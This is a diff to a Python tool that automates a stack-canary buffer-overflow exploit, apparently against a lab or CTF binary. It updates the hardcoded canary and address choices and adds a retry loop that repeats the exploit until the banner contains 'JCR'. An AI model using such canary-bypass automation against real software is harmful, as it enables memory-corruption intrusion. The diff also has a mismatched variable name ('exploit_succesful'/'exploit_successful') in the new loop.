@@ -85,7 +85,7 @@ def medium_bfo_exploit(program_name, chosen_canary, chosen_addr, buffer_overflow
     banner = io.read(1024)
     print(banner)
 
-    print(f"{Fore.GREEN}[+] Exploit was successful!")
+    return banner
 
 def signal_handler(sig, frame):
     print("\nCtrl+C detected. Exiting gracefully...")
@@ -139,7 +139,7 @@ def detect_canaries(program_name, detect_type='canary', option=None, choice=None
                         print(f"{Fore.YELLOW}{idx+1}{Fore.RESET}: Position = {Fore.GREEN}{pos}{Fore.RESET}, Canary = {Fore.GREEN}{canary}{Fore.RESET}")
                     time.sleep(1)
                     if choice is None:
-                        choice = input(f"\n{Fore.YELLOW}[+]{Fore.RESET} Choose a canary, right one is number 1 (Enter number, r to rerun, b to go back): ").strip()
+                        choice = input(f"\n{Fore.YELLOW}[+]{Fore.RESET} Choose a canary, right one is number 2 (Enter number, r to rerun, b to go back): ").strip()
 
                     if choice.lower() == 'r':
                         choice = None
@@ -570,7 +570,7 @@ def main():
             print(f"\n{Fore.BLUE}[AUTORUN]{Fore.RESET} This exploit is going to automatically fuzz the buffer-overflow length and then its fuzzing the canary pointers and you need to choose the right one...")
             time.sleep(1)
             print(f"\n{Fore.BLUE}[AUTORUN]{Fore.RESET} You are now going to try to find the canary stack pointer..")
-            result = detect_canaries(program_name, 'canary', '1', '1')
+            result = detect_canaries(program_name, 'canary', '1', '2')
             if result is not None:
                 if len(result) == 2:
                     chosen_canary = result[0]
@@ -598,7 +598,7 @@ def main():
             time.sleep(1)
             print(f"\n{Fore.BLUE}[AUTORUN]{Fore.RESET} You are first going to try to find the canary stack pointer..")
             time.sleep(1)
-            result = detect_canaries(program_name, 'canary', '1', '1')
+            result = detect_canaries(program_name, 'canary', '1', '2')
             if result is not None: 
                 if len(result) == 2:
                     chosen_canary = result[0]
@@ -611,7 +611,7 @@ def main():
             
             print(f"\n{Fore.BLUE}[AUTORUN]{Fore.RESET} Now you need to find the proper base address pointer")
             time.sleep(1)
-            result = detect_canaries(program_name, 'address', '1', '7')
+            result = detect_canaries(program_name, 'address', '1', '10')
             if result is not None:
                 if len(result) == 2:
                     chosen_addr = result[0]
@@ -633,7 +633,15 @@ def main():
             print(f"{Fore.BLUE}-----------------------------------------{Fore.RESET}")
             print("Lets start exploiting")
             time.sleep(1)
-            medium_bfo_exploit(program_name, chosen_canary, chosen_addr, buffer_overflow_length)
+            exploit_succesful = False
+
+            while not exploit_succesful:
+                banner = medium_bfo_exploit(program_name, chosen_canary, chosen_addr, buffer_overflow_length)
+
+                if b"JCR" in banner: 
+                    exploit_successful = True
+                    print(f"{Fore.GREEN}[+] Exploit was successful!")
+                    break
             pass
     else:
         print("Invalid choice. Exiting.")
